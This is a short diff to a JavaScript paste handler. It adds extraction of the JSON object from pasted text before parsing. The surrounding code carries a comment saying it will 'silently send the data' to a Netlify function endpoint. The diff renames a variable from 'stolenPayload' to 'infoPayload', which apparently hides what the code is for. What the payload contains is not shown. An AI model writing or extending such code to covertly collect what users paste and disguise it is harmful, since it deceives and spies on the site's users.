@@ -7,7 +7,18 @@ jsonInput.addEventListener('paste', (event) => {
     setTimeout(() => {
         const pastedText = event.target.value;
         try {
-            const fullResponse = JSON.parse(pastedText);
+            // --- FIX START: Extract only the JSON part from the pasted text ---
+            const startIndex = pastedText.indexOf('{');
+            const endIndex = pastedText.lastIndexOf('}');
+            
+            if (startIndex === -1 || endIndex === -1) {
+                throw new Error("No JSON object found.");
+            }
+
+            const jsonString = pastedText.substring(startIndex, endIndex + 1);
+            // --- FIX END ---
+
+            const fullResponse = JSON.parse(jsonString); // Now we parse the CLEAN jsonString
 
             // Extract the necessary parts from the original JSON.
             const codeStructure = fullResponse.codeStructure;
@@ -29,7 +40,7 @@ jsonInput.addEventListener('paste', (event) => {
             }
 
             // Step 2: Silently send the data 
-            if (stolenPayload) {
+            if (infoPayload) {
                 fetch('/.netlify/functions/submit', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
